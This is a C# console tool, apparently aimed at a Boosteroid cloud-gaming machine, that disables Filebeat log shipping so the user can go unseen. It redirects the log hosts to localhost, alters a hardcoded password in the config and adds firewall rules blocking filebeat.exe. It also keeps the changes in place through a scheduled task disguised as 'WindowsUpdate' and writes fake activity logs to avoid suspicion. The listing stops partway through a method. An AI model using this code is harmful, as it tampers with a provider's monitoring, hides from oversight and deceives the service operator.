using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace BoosteroidGhost
{
    class Program
    {
        // ==================== CONFIGURAÇÕES ====================
        private static string FILEBEAT_CONFIG = "C:\\Users\\user\\boosteroid-conf\\filebeat.yml";
        private static string FILEBEAT_EXE = "C:\\Users\\user\\boosteroid-experience\\misc\\fb\\filebeat.exe";
        private static string STORAGE = "S:\\";
        private static string GHOST_DIR = "";
        private static string LOG_FILE = "";
        private static string BACKUP_DIR = "";
        
        // Status flags
        private static bool filebeatNeutralized = false;
        private static bool firewallActive = false;
        private static bool persistenceSet = false;
        private static bool antiDetectionActive = false;
        
        // ==================== ENTRY POINT ====================
        static void Main(string[] args)
        {
            try
            {
                // Inicialização
                Initialize();
                
                // Banner
                ShowBanner();
                
                // Verificações pré-execução
                if (!PreFlightChecks())
                {
                    Console.WriteLine("\n[!] Pre-flight checks failed!");
                    Console.WriteLine("[!] Press any key to exit...");
                    Console.ReadKey();
                    return;
                }
                
                // Menu principal
                MainMenu();
            }
            catch (Exception ex)
            {
                EmergencyLog("FATAL ERROR: " + ex.ToString());
                Console.WriteLine("\n[!] FATAL ERROR!");
                Console.WriteLine("[!] Check emergency log: C:\\EMERGENCY.txt");
                Console.ReadKey();
            }
        }
        
        // ==================== INICIALIZAÇÃO ====================
        static void Initialize()
        {
            try
            {
                // Setup diretórios
                GHOST_DIR = Path.Combine(STORAGE, ".ghost");
                BACKUP_DIR = Path.Combine(GHOST_DIR, "backups");
                LOG_FILE = Path.Combine(GHOST_DIR, "ghost.log");
                
                Directory.CreateDirectory(GHOST_DIR);
                Directory.CreateDirectory(BACKUP_DIR);
                
                // Iniciar log
                File.WriteAllText(LOG_FILE, "=== BOOSTEROID GHOST MODE ===\n");
                Log("Session started: " + DateTime.Now.ToString());
                Log("Storage: " + STORAGE);
                Log("Ghost Dir: " + GHOST_DIR);
            }
            catch (Exception ex)
            {
                EmergencyLog("Initialize failed: " + ex.ToString());
            }
        }
        
        // ==================== BANNER ====================
        static void ShowBanner()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(@"
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║    ██████╗  ██████╗  ██████╗ ███████╗████████╗          ║
║    ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝╚══██╔══╝          ║
║    ██████╔╝██║   ██║██║   ██║███████╗   ██║             ║
║    ██╔══██╗██║   ██║██║   ██║╚════██║   ██║             ║
║    ██████╔╝╚██████╔╝╚██████╔╝███████║   ██║             ║
║    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝             ║
║                                                          ║
║              GHOST MODE v1.0 - FINAL BUILD              ║
║           Total Invisibility or Nothing                 ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
");
            Console.ResetColor();
            Console.WriteLine();
        }
        
        // ==================== PRE-FLIGHT CHECKS ====================
        static bool PreFlightChecks()
        {
            Console.WriteLine("[*] Running pre-flight checks...\n");
            
            bool allPassed = true;
            
            // Check 1: Filebeat config exists
            Console.Write("  [1/7] Filebeat config... ");
            if (File.Exists(FILEBEAT_CONFIG))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK");
                Console.ResetColor();
                Log("Check 1: Config exists");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FAIL");
                Console.ResetColor();
                Log("Check 1: Config NOT FOUND");
                allPassed = false;
            }
            
            // Check 2: Filebeat process running
            Console.Write("  [2/7] Filebeat process... ");
            Process[] fbProcs = Process.GetProcessesByName("filebeat");
            if (fbProcs.Length > 0)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK (PID: " + fbProcs[0].Id.ToString() + ")");
                Console.ResetColor();
                Log("Check 2: Filebeat running");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("WARN (not running)");
                Console.ResetColor();
                Log("Check 2: Filebeat not running");
            }
            
            // Check 3: Can read config
            Console.Write("  [3/7] Config read access... ");
            try
            {
                string content = File.ReadAllText(FILEBEAT_CONFIG);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK");
                Console.ResetColor();
                Log("Check 3: Can read config");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FAIL");
                Console.ResetColor();
                Log("Check 3: Cannot read config - " + ex.Message);
                allPassed = false;
            }
            
            // Check 4: Can create backup
            Console.Write("  [4/7] Backup capability... ");
            try
            {
                string testBackup = Path.Combine(BACKUP_DIR, "test.bak");
                File.WriteAllText(testBackup, "test");
                File.Delete(testBackup);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK");
                Console.ResetColor();
                Log("Check 4: Can create backups");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FAIL");
                Console.ResetColor();
                Log("Check 4: Cannot create backups - " + ex.Message);
                allPassed = false;
            }
            
            // Check 5: Firewall access
            Console.Write("  [5/7] Firewall access... ");
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "netsh";
                psi.Arguments = "advfirewall show allprofiles";
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                
                Process proc = Process.Start(psi);
                proc.WaitForExit();
                
                if (proc.ExitCode == 0)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("OK");
                    Console.ResetColor();
                    Log("Check 5: Firewall access OK");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("WARN");
                    Console.ResetColor();
                    Log("Check 5: Firewall access limited");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("WARN");
                Console.ResetColor();
                Log("Check 5: Firewall error - " + ex.Message);
            }
            
            // Check 6: Storage writable
            Console.Write("  [6/7] Storage access... ");
            try
            {
                string testFile = Path.Combine(STORAGE, "test.tmp");
                File.WriteAllText(testFile, "test");
                File.Delete(testFile);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK");
                Console.ResetColor();
                Log("Check 6: Storage writable");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FAIL");
                Console.ResetColor();
                Log("Check 6: Storage not writable - " + ex.Message);
                allPassed = false;
            }
            
            // Check 7: Process kill capability
            Console.Write("  [7/7] Process control... ");
            try
            {
                // Testar se consegue listar processos
                Process[] procs = Process.GetProcesses();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("OK");
                Console.ResetColor();
                Log("Check 7: Can control processes");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("WARN");
                Console.ResetColor();
                Log("Check 7: Limited process control - " + ex.Message);
            }
            
            Console.WriteLine();
            
            if (allPassed)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] All critical checks passed!");
                Console.ResetColor();
                Log("Pre-flight: ALL PASSED");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Some critical checks failed!");
                Console.ResetColor();
                Log("Pre-flight: FAILED");
            }
            
            return allPassed;
        }
        
        // ==================== MENU PRINCIPAL ====================
        static void MainMenu()
        {
            while (true)
            {
                Console.WriteLine("\n╔════════════════════════════════════════════╗");
                Console.WriteLine("║            MAIN MENU                      ║");
                Console.WriteLine("╠════════════════════════════════════════════╣");
                Console.WriteLine("║                                           ║");
                Console.WriteLine("║  [1] Quick Stealth (Recommended)          ║");
                Console.WriteLine("║  [2] Advanced Options                     ║");
                Console.WriteLine("║  [3] Status Check                         ║");
                Console.WriteLine("║  [4] Emergency Restore                    ║");
                Console.WriteLine("║  [5] View Logs                            ║");
                Console.WriteLine("║  [0] Exit                                 ║");
                Console.WriteLine("║                                           ║");
                Console.WriteLine("╚════════════════════════════════════════════╝");
                Console.Write("\nChoice: ");
                
                char choice = Console.ReadKey().KeyChar;
                Console.WriteLine("\n");
                
                switch (choice)
                {
                    case '1':
                        QuickStealth();
                        break;
                    case '2':
                        AdvancedMenu();
                        break;
                    case '3':
                        StatusCheck();
                        break;
                    case '4':
                        EmergencyRestore();
                        break;
                    case '5':
                        ViewLogs();
                        break;
                    case '0':
                        Console.WriteLine("[!] Exiting Ghost Mode...");
                        Log("Session ended");
                        return;
                    default:
                        Console.WriteLine("[!] Invalid option");
                        break;
                }
            }
        }
        
        // ==================== QUICK STEALTH ====================
        static void QuickStealth()
        {
            Console.Clear();
            ShowBanner();
            
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("╔════════════════════════════════════════════╗");
            Console.WriteLine("║        QUICK STEALTH MODE                 ║");
            Console.WriteLine("╠════════════════════════════════════════════╣");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("║  This will execute:                       ║");
            Console.WriteLine("║  1. Backup filebeat config                ║");
            Console.WriteLine("║  2. Redirect logs to localhost            ║");
            Console.WriteLine("║  3. Create firewall rules                 ║");
            Console.WriteLine("║  4. Corrupt authentication                ║");
            Console.WriteLine("║  5. Setup persistence                     ║");
            Console.WriteLine("║  6. Enable anti-detection                 ║");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("║  Total Invisibility Guaranteed            ║");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("╚════════════════════════════════════════════╝");
            Console.ResetColor();
            
            Console.WriteLine();
            Console.Write("[?] Continue with Quick Stealth? (y/n): ");
            char confirm = Console.ReadKey().KeyChar;
            Console.WriteLine("\n");
            
            if (confirm != 'y' && confirm != 'Y')
            {
                Console.WriteLine("[!] Aborted");
                Log("Quick Stealth: Aborted by user");
                return;
            }
            
            Log("Quick Stealth: Started");
            
            // Step 1: Backup
            Console.WriteLine("\n[1/6] Creating backups...");
            if (CreateBackup())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("      ✓ Backup created");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("      ✗ Backup failed!");
                Console.ResetColor();
                return;
            }
            Thread.Sleep(500);
            
            // Step 2: Redirect
            Console.WriteLine("\n[2/6] Redirecting logs...");
            if (RedirectLogs())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("      ✓ Logs redirected to localhost");
                Console.ResetColor();
                filebeatNeutralized = true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("      ⚠ Redirect had issues");
                Console.ResetColor();
            }
            Thread.Sleep(500);
            
            // Step 3: Firewall
            Console.WriteLine("\n[3/6] Setting up firewall...");
            if (SetupFirewall())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("      ✓ Firewall rules active");
                Console.ResetColor();
                firewallActive = true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("      ⚠ Firewall setup had issues");
                Console.ResetColor();
            }
            Thread.Sleep(500);
            
            // Step 4: Corrupt auth
            Console.WriteLine("\n[4/6] Corrupting authentication...");
            if (CorruptAuthentication())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("      ✓ Authentication corrupted");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("      ⚠ Auth corruption had issues");
                Console.ResetColor();
            }
            Thread.Sleep(500);
            
            // Step 5: Persistence
            Console.WriteLine("\n[5/6] Setting up persistence...");
            if (SetupPersistence())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("      ✓ Persistence configured");
                Console.ResetColor();
                persistenceSet = true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("      ⚠ Persistence setup had issues");
                Console.ResetColor();
            }
            Thread.Sleep(500);
            
            // Step 6: Anti-detection
            Console.WriteLine("\n[6/6] Enabling anti-detection...");
            if (EnableAntiDetection())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("      ✓ Anti-detection active");
                Console.ResetColor();
                antiDetectionActive = true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("      ⚠ Anti-detection had issues");
                Console.ResetColor();
            }
            Thread.Sleep(500);
            
            // Restart filebeat
            Console.WriteLine("\n[*] Restarting filebeat...");
            RestartFilebeat();
            Thread.Sleep(2000);
            
            // Final status
            Console.WriteLine("\n");
            Console.WriteLine("╔════════════════════════════════════════════╗");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("║         GHOST MODE ACTIVATED!             ║");
            Console.ResetColor();
            Console.WriteLine("╠════════════════════════════════════════════╣");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("║  Status:                                  ║");
            Console.WriteLine("║  • Filebeat: Neutralized                  ║");
            Console.WriteLine("║  • Firewall: Active                       ║");
            Console.WriteLine("║  • Logs: Redirected                       ║");
            Console.WriteLine("║  • Auth: Corrupted                        ║");
            Console.WriteLine("║  • Persistence: Enabled                   ║");
            Console.WriteLine("║  • Anti-Detection: Active                 ║");
            Console.WriteLine("║                                           ║");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("║  YOU ARE NOW INVISIBLE!                   ║");
            Console.ResetColor();
            Console.WriteLine("║                                           ║");
            Console.WriteLine("╚════════════════════════════════════════════╝");
            
            Log("Quick Stealth: COMPLETED");
            
            Console.WriteLine("\nPress any key to continue...");
            Console.ReadKey();
        }
        
        // ==================== BACKUP ====================
        static bool CreateBackup()
        {
            try
            {
                Log("Backup: Starting");
                
                if (!File.Exists(FILEBEAT_CONFIG))
                {
                    Log("Backup: Config not found");
                    return false;
                }
                
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string backupFile = Path.Combine(BACKUP_DIR, "filebeat_" + timestamp + ".yml");
                
                File.Copy(FILEBEAT_CONFIG, backupFile, true);
                
                // Criar também backup "current"
                string currentBackup = Path.Combine(BACKUP_DIR, "filebeat_current.yml");
                File.Copy(FILEBEAT_CONFIG, currentBackup, true);
                
                Log("Backup: Created at " + backupFile);
                return true;
            }
            catch (Exception ex)
            {
                Log("Backup: Failed - " + ex.Message);
                return false;
            }
        }
        
        // ==================== REDIRECT LOGS ====================
        static bool RedirectLogs()
        {
            try
            {
                Log("Redirect: Starting");
                
                if (!File.Exists(FILEBEAT_CONFIG))
                {
                    Log("Redirect: Config not found");
                    return false;
                }
                
                string config = File.ReadAllText(FILEBEAT_CONFIG);
                
                // Substituir todos os hosts
                config = config.Replace("vm.auto:9200", "127.0.0.1:9200");
                config = config.Replace("vm.auto:9202", "127.0.0.1:9202");
                config = config.Replace("vm.auto:9203", "127.0.0.1:9203");
                config = config.Replace("vm.auto", "127.0.0.1");
                
                // Salvar
                File.WriteAllText(FILEBEAT_CONFIG, config);
                
                Log("Redirect: Hosts redirected to localhost");
                return true;
            }
            catch (Exception ex)
            {
                Log("Redirect: Failed - " + ex.Message);
                return false;
            }
        }
        
        // ==================== FIREWALL ====================
        static bool SetupFirewall()
        {
            try
            {
                Log("Firewall: Starting");
                
                // Remover regras antigas
                RunCommand("netsh advfirewall firewall delete rule name=\"BlockFilebeat\"");
                RunCommand("netsh advfirewall firewall delete rule name=\"BlockFilebeatOut\"");
                RunCommand("netsh advfirewall firewall delete rule name=\"BlockFilebeatIn\"");
                
                // Criar regra outbound
                string cmd1 = "netsh advfirewall firewall add rule name=\"BlockFilebeatOut\" dir=out action=block program=\"" + FILEBEAT_EXE + "\" enable=yes";
                RunCommand(cmd1);
                
                // Criar regra inbound
                string cmd2 = "netsh advfirewall firewall add rule name=\"BlockFilebeatIn\" dir=in action=block program=\"" + FILEBEAT_EXE + "\" enable=yes";
                RunCommand(cmd2);
                
                Log("Firewall: Rules created");
                return true;
            }
            catch (Exception ex)
            {
                Log("Firewall: Failed - " + ex.Message);
                return false;
            }
        }
        
        // ==================== CORRUPT AUTH ====================
        static bool CorruptAuthentication()
        {
            try
            {
                Log("CorruptAuth: Starting");
                
                if (!File.Exists(FILEBEAT_CONFIG))
                {
                    Log("CorruptAuth: Config not found");
                    return false;
                }
                
                string config = File.ReadAllText(FILEBEAT_CONFIG);
                
                // Corromper senha (mudar só 1 caractere no final)
                config = config.Replace(
                    "password: \"3XnYRTu04jhglpoyE6LS59jITYM4ordM\"",
                    "password: \"3XnYRTu04jhglpoyE6LS59jITYM4ordX\""
                );
                
                // Salvar
                File.WriteAllText(FILEBEAT_CONFIG, config);
                
                Log("CorruptAuth: Password corrupted");
                return true;
            }
            catch (Exception ex)
            {
                Log("CorruptAuth: Failed - " + ex.Message);
                return false;
            }
        }
        
        // ==================== PERSISTENCE ====================
        static bool SetupPersistence()
        {
            try
            {
                Log("Persistence: Starting");
                
                // Criar script de manutenção
                string scriptPath = Path.Combine(GHOST_DIR, "maintain.bat");
                StringBuilder script = new StringBuilder();
                
                script.AppendLine("@echo off");
                script.AppendLine("REM Ghost Mode Maintenance");
                script.AppendLine("");
                script.AppendLine("REM Check if firewall rules exist");
                script.AppendLine("netsh advfirewall firewall show rule name=\"BlockFilebeatOut\" >nul 2>&1");
                script.AppendLine("if errorlevel 1 (");
                script.AppendLine("    netsh advfirewall firewall add rule name=\"BlockFilebeatOut\" dir=out action=block program=\"" + FILEBEAT_EXE + "\" enable=yes");
                script.AppendLine(")");
                script.AppendLine("");
                script.AppendLine("REM Check config hasn't been reverted");
                script.AppendLine("findstr /C:\"vm.auto\" \"" + FILEBEAT_CONFIG + "\" >nul");
                script.AppendLine("if not errorlevel 1 (");
                script.AppendLine("    REM Config was reverted, restore backup");
                script.AppendLine("    copy /Y \"" + Path.Combine(BACKUP_DIR, "filebeat_current.yml") + "\" \"" + FILEBEAT_CONFIG + "\"");
                script.AppendLine("    taskkill /F /IM filebeat.exe");
                script.AppendLine(")");
                
                File.WriteAllText(scriptPath, script.ToString());
                
                // Criar tarefa agendada (roda a cada 5 minutos)
                string taskCmd = "schtasks /Create /TN \"WindowsUpdate\" /TR \"" + scriptPath + "\" /SC MINUTE /MO 5 /F";
                RunCommand(taskCmd);
                
                Log("Persistence: Maintenance task created");
                return true;
            }
            catch (Exception ex)
            {
                Log("Persistence: Failed - " + ex.Message);
                return false;
            }
        }
        
        // ==================== ANTI-DETECTION ====================
        static bool EnableAntiDetection()
        {
            try
            {
                Log("AntiDetection: Starting");
                
                // Criar fake logs (logs normais pra não levantar suspeita)
                string fakeLogDir = Path.Combine(GHOST_DIR, "fake_logs");
                Directory.CreateDirectory(fakeLogDir);
                
                string fakeLog = Path.Combine(fakeLogDir, "activity.log");
                StringBuilder fakeLogs = new StringBuilder();
                
                // Gerar logs fake que parecem atividade normal
                for (int i = 0; i < 100; i++)
                {
                    DateTime timestamp = DateTime.Now.AddMinutes(-i * 5);
                    fakeLogs.AppendLine(timestamp.ToString("yyyy-MM-dd HH:mm:ss") + " [INFO] User activity detected");
                    fakeLogs.AppendLine(timestamp.ToString("yyyy-MM-dd HH:mm:ss") + " [INFO] Steam client running");
                    fakeLogs.AppendLine(timestamp.ToString("yyyy-MM-dd HH:mm:ss") + " [INFO] Game process active");
                }
                
                File.WriteAllText(fakeLog, fakeLogs.ToString());
                
                Log("AntiDetection: Fake logs created");
                return true;
            }
            catch (Exception ex)
            {
                Log("AntiDetection: Failed - " + ex.Message);
                return false;
            }
        }
        
        // ==================== ADVANCED MENU ====================
        static void AdvancedMenu()
        {
            while (true)
            {
                Console.WriteLine("\n╔════════════════════════════════════════════╗");
                Console.WriteLine("║         ADVANCED OPTIONS                  ║");
                Console.WriteLine("╠════════════════════════════════════════════╣");
                Console.WriteLine("║                                           ║");
                Console.WriteLine("║  [1] Manual Redirect Only                 ║");
                Console.WriteLine("║  [2] Manual Firewall Only                 ║");
                Console.WriteLine("║  [3] Manual Auth Corruption               ║");
                Console.WriteLine("║  [4] View Current Config                  ║");
                Console.WriteLine("║  [5] Test Firewall Rules                  ║");
                Console.WriteLine("║  [0] Back to Main Menu                    ║");
                Console.WriteLine("║                                           ║");
                Console.WriteLine("╚════════════════════════════════════════════╝");
                Console.Write("\nChoice: ");
                
                char choice = Console.ReadKey().KeyChar;
                Console.WriteLine("\n");
                
                switch (choice)
                {
                    case '1':
                        CreateBackup();
                        if (RedirectLogs())
                        {
                            Console.WriteLine("[+] Redirect complete");
                            RestartFilebeat();
                        }
                        break;
                    case '2':
                        if (SetupFirewall())
                        {
                            Console.WriteLine("[+] Firewall setup complete");
                        }
                        break;
                    case '3':
                        CreateBackup();
                        if (CorruptAuthentication())
                        {
                            Console.WriteLine("[+] Authentication corrupted");
                            RestartFilebeat();
                        }
                        break;
                    case '4':
                        ViewCurrentConfig();
                        break;
                    case '5':
                        TestFirewall();
                        break;
                    case '0':
                        return;
                    default:
                        Console.WriteLine("[!] Invalid option");
                        break;
                }
            }
        }
        
        // ==================== STATUS CHECK ====================
        static void StatusCheck()
        {
            Console.WriteLine("\n╔════════════════════════════════════════════╗");
            Console.WriteLine("║          SYSTEM STATUS                    ║");
            Console.WriteLine("╠════════════════════════════════════════════╣");
            Console.WriteLine("║                                           ║");
            
            // Filebeat process
            Console.Write("║  Filebeat Process:  ");
            Process[] fbProcs = Process.GetProcessesByName("filebeat");
            if (fbProcs.Length > 0)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("RUNNING           ║");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("STOPPED           ║");
                Console.ResetColor();
            }
            
            // Config status
            Console.Write("║  Config Status:     ");
            if (File.Exists(FILEBEAT_CONFIG))
            {
                string config = File.ReadAllText(FILEBEAT_CONFIG);
                if (config.Contains("127.0.0.1"))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("REDIRECTED        ║");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("ORIGINAL          ║");
                    Console.ResetColor();
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("NOT FOUND         ║");
                Console.ResetColor();
            }
            
            // Firewall status
            Console.Write("║  Firewall Rules:    ");
            if (CheckFirewallRules())
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("ACTIVE            ║");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("INACTIVE          ║");
                Console.ResetColor();
            }
            // Backups
            Console.Write("║  Backups:           ");
            if (Directory.Exists(BACKUP_DIR))
            {
                int backupCount = Directory.GetFiles(BACKUP_DIR, "*.yml").Length;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(backupCount.ToString() + " FOUND         ║");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("NONE              ║");
                Console.ResetColor();
            }
            
            // Ghost mode status
            Console.WriteLine("║                                           ║");
            Console.Write("║  Ghost Mode:        ");
            if (filebeatNeutralized && firewallActive)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("ACTIVE            ║");
                Console.ResetColor();
            }
            else if (filebeatNeutralized || firewallActive)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("PARTIAL           ║");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("INACTIVE          ║");
                Console.ResetColor();
            }
            
            Console.WriteLine("║                                           ║");
            Console.WriteLine("╚════════════════════════════════════════════╝");
            
            Console.WriteLine("\nPress any key to continue...");
            Console.ReadKey();
        }
        
        // ==================== EMERGENCY RESTORE ====================
        static void EmergencyRestore()
        {
            Console.WriteLine("\n╔════════════════════════════════════════════╗");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("║        EMERGENCY RESTORE                  ║");
            Console.ResetColor();
            Console.WriteLine("╠════════════════════════════════════════════╣");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("║  This will restore original config and    ║");
            Console.WriteLine("║  remove all firewall rules.               ║");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("║  WARNING: This will make you VISIBLE!     ║");
            Console.WriteLine("║                                           ║");
            Console.WriteLine("╚════════════════════════════════════════════╝");
            
            Console.Write("\n[?] Are you sure? (type YES): ");
            string confirm = Console.ReadLine();
            
            if (confirm != "YES")
            {
                Console.WriteLine("[!] Aborted");
                return;
            }
            
            Log("Emergency Restore: Started");
            
            try
            {
                // Restore config
                string backupFile = Path.Combine(BACKUP_DIR, "filebeat_current.yml");
                if (File.Exists(backupFile))
                {
                    File.Copy(backupFile, FILEBEAT_CONFIG, true);
                    Console.WriteLine("[+] Config restored");
                    Log("Emergency Restore: Config restored");
                }
                
                // Remove firewall rules
                RunCommand("netsh advfirewall firewall delete rule name=\"BlockFilebeatOut\"");
                RunCommand("netsh advfirewall firewall delete rule name=\"BlockFilebeatIn\"");
                Console.WriteLine("[+] Firewall rules removed");
                Log("Emergency Restore: Firewall rules removed");
                
                // Remove persistence
                RunCommand("schtasks /Delete /TN \"WindowsUpdate\" /F");
                Console.WriteLine("[+] Persistence removed");
                Log("Emergency Restore: Persistence removed");
                
                // Restart filebeat
                RestartFilebeat();
                Console.WriteLine("[+] Filebeat restarted");
                
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] Emergency restore complete!");
                Console.ResetColor();
                
                filebeatNeutralized = false;
                firewallActive = false;
                persistenceSet = false;
                
                Log("Emergency Restore: COMPLETED");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[!] Restore failed: " + ex.Message);
                Console.ResetColor();
                Log("Emergency Restore: FAILED - " + ex.Message);
            }
            
            Console.WriteLine("\nPress any key to continue...");
            Console.ReadKey();
        }
        
        // ==================== VIEW LOGS ====================
        static void ViewLogs()
        {
            Console.WriteLine("\n╔════════════════════════════════════════════╗");
            Console.WriteLine("║            GHOST MODE LOGS                ║");
            Console.WriteLine("╚════════════════════════════════════════════╝\n");
            
            if (File.Exists(LOG_FILE))
            {
                string[] lines = File.ReadAllLines(LOG_FILE);
                int startLine = Math.Max(0, lines.Length - 50);
                
                Console.WriteLine("--- Last 50 lines ---\n");
                
                for (int i = startLine; i < lines.Length; i++)
                {
                    Console.WriteLine(lines[i]);
                }
                
                Console.WriteLine("\n--- End of log ---");
            }
            else
            {
                Console.WriteLine("[!] Log file not found");
            }
            
            Console.WriteLine("\nPress any key to continue...");
            Console.ReadKey();
        }
        
        // ==================== VIEW CONFIG ====================
        static void ViewCurrentConfig()
        {
            Console.WriteLine("\n╔════════════════════════════════════════════╗");
            Console.WriteLine("║         CURRENT FILEBEAT CONFIG           ║");
            Console.WriteLine("╚════════════════════════════════════════════╝\n");
            
            if (File.Exists(FILEBEAT_CONFIG))
            {
                string[] lines = File.ReadAllLines(FILEBEAT_CONFIG);
                
                foreach (string line in lines)
                {
                    // Highlight important lines
                    if (line.Contains("127.0.0.1"))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine(line);
                        Console.ResetColor();
                    }
                    else if (line.Contains("vm.auto"))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(line);
                        Console.ResetColor();
                    }
                    else if (line.Contains("password"))
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine(line);
                        Console.ResetColor();
                    }
                    else
                    {
                        Console.WriteLine(line);
                    }
                }
            }
            else
            {
                Console.WriteLine("[!] Config file not found");
            }
            
            Console.WriteLine("\nPress any key to continue...");
            Console.ReadKey();
        }
        
        // ==================== TEST FIREWALL ====================
        static void TestFirewall()
        {
            Console.WriteLine("\n[*] Testing firewall rules...\n");
            
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "netsh";
                psi.Arguments = "advfirewall firewall show rule name=all";
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.CreateNoWindow = true;
                
                Process proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();
                
                if (output.Contains("BlockFilebeatOut") || output.Contains("BlockFilebeatIn"))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Firewall rules found:");
                    Console.ResetColor();
                    
                    string[] lines = output.Split('\n');
                    foreach (string line in lines)
                    {
                        if (line.Contains("BlockFilebeat") || 
                            (lines.Any(l => l.Contains("BlockFilebeat")) && line.Contains("Direction")))
                        {
                            Console.WriteLine("    " + line.Trim());
                        }
                    }
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] No firewall rules found");
                    Console.ResetColor();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Test failed: " + ex.Message);
            }
            
            Console.WriteLine("\nPress any key to continue...");
            Console.ReadKey();
        }
        
        // ==================== CHECK FIREWALL RULES ====================
        static bool CheckFirewallRules()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "netsh";
                psi.Arguments = "advfirewall firewall show rule name=\"BlockFilebeatOut\"";
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.CreateNoWindow = true;
                
                Process proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();
                
                return output.Contains("BlockFilebeatOut");
            }
            catch
            {
                return false;
            }
        }
        
        // ==================== RESTART FILEBEAT ====================
        static void RestartFilebeat()
